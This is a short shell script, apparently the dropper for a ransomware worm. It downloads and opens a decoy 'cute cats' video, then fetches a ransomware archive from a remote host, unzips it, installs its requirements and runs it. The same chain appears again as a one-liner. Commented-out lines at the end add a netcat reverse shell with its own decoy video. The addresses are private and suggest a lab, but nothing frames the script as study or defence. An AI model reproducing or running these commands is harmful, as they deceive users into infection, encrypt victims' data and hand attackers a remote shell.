mkdir ransom-worm; cd ransom-worm; # Creates the ransomware folder
/usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video'; # Downloads the video
/usr/bin/xdg-open cutecats.mp4; # Opens the video 
/usr/bin/wget -O ransom-worm.zip '10.0.2.15:8000/send_ransomworm'; # Downloads the worm
/usr/bin/unzip ransom-worm.zip; # Unzips the worm
python3 -m pip install -r requirements.txt; # Installs the requirements.txt
python3 main.py; # Runs the ransomware

mkdir ransom-worm; cd ransom-worm; /usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video'; /usr/bin/xdg-open cutecats.mp4; /usr/bin/wget -O ransom-worm.zip '10.0.2.15:8000/send_ransomworm'; /usr/bin/unzip ransom-worm.zip; python3 -m pip install -r requirements.txt; python3 main.py;

# /usr/bin/mkfifo /tmp/f; 
# /usr/bin/wget 'http://10.0.2.5/video.mp4' -O /tmp/video.mp4; 
# /usr/bin/xdg-open /tmp/video.mp4; 
# /usr/bin/mkfifo /tmp/f; 
# /bin/nc 10.0.2.5 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 & 